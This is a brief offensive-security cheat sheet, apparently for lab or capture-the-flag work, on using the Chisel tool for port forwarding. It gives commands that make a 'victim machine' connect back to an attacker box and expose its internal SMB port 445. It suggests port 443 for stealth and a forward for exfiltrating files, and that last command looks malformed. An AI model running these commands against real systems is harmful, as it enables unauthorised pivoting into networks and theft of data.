## How to Forward Ports with Chisel

--> It's really easy and helpful because you can **expose internal ports!!!**

**server (Kailbox):** 

--> Enable reveres forwarding
```
./chisel server --reverse
```

**client (victim machine)**

--> Connect back to server and reverse forward:

```
chisel client 10.10.14.25:8080 R:2222:localhost:445
```

--> You can do more with this as well like setup ssl, and ports over 443 for stealth.  
--> Read more at:  
https://github.com/jpillora/chisel


---
<br/>


## Basic local forward from local host:
--> If yo want to exfil files or something

```
chisel server --port 13000

chisel client 10.10.14.16 13000
```
